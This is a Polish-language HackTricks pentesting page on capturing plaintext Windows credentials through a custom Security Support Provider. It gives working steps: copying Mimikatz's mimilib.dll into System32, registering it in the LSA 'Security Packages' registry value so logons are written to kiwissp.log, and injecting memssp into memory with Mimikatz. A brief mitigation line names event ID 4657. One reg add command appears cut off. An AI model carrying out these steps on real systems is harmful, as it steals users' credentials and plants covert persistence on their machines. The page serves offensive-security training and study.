# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać** w **postaci jawnego tekstu** **dane uwierzytelniające** używane do uzyskania dostępu do maszyny.

#### Mimilib

Możesz użyć pliku binarnego `mimilib.dll` dostarczonego przez Mimikatz. **Spowoduje to zapisanie w pliku wszystkich danych uwierzytelniających w postaci jawnego tekstu.**\
Umieść bibliotekę DLL w `C:\Windows\System32\`\
Pobierz listę istniejących pakietów zabezpieczeń LSA:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Dodaj `mimilib.dll` do listy Security Support Provider (Security Packages):
```bash
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
A po ponownym uruchomieniu wszystkie dane uwierzytelniające można znaleźć w postaci jawnego tekstu w `C:\Windows\System32\kiwissp.log`

#### W pamięci

Możesz również wstrzyknąć to bezpośrednio do pamięci za pomocą Mimikatz (zauważ, że może to być nieco niestabilne lub nie działać):
```bash
privilege::debug
misc::memssp
```
Nie przetrwa ponownego uruchomienia systemu.

#### Środki zaradcze

Identyfikator zdarzenia 4657 - Audyt utworzenia/zmiany `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
